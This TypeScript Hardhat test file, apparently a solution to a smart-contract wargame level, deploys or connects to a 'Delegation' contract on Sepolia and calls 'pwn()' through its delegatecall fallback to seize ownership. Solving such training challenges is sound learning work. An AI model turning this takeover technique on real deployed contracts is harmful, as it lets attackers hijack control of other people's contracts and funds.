import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Delegate__factory, Delegation__factory } from "../../typechain-types/factories/security/Delegate.sol";
import { Delegate, Delegation } from "../../typechain-types/security/Delegate.sol";
import { createWallet, tx2contract } from "../sdk";
const hre = require('hardhat');

describe("Hack", function () {
  this.timeout(6000000);

  let signers : SignerWithAddress[]
  let owner: SignerWithAddress;
  let c : Delegate
  let hc : Delegation

  before(async () => {
    signers = await ethers.getSigners()
    owner = signers[0];
    console.log("owner : ", owner.address)

  });

  it("Deploy Contract", async function () {
		if (hre.hardhatArguments.network == undefined) {
      c = await new Delegate__factory(owner).deploy(signers[10].address)
      console.log("c address : ", c.address)
    }
  });

  it("Deploy HackContract", async function () {
		if (hre.hardhatArguments.network == undefined) {
      const CONTRACT_ADDR = c.address
      hc = await new Delegation__factory(owner).deploy(CONTRACT_ADDR)
      console.log("hc address : ", hc.address)
    } else {
      const  HC_CONTRACT_ADDR = "0xC7dedc2E62f7167845168751F923AA000Eb67814"
      hc = Delegation__factory.connect(HC_CONTRACT_ADDR, owner)
    }
  });

  it("hack tx", async function () {
    let signer = owner

    async function tx() {
      
      const abi = [
        "function pwn() external"
      ]
    
      const TX_VALUE = ethers.utils.parseEther("0")
      const TX_GAS_LIMIT = BigInt(1000000)
      const reciept = await tx2contract(
        hc.address,
        abi,
        "pwn",
        [],
        signer,
        TX_VALUE.toBigInt(),
        TX_GAS_LIMIT
      )
      console.log("reciept : ", reciept)
    }

    await tx()

		if (hre.hardhatArguments.network == undefined) {
      expect(await hc.owner()).eq(signer.address)
    }
  });

});



// Test : yarn hardhat test test/security/*.ts --network sepolia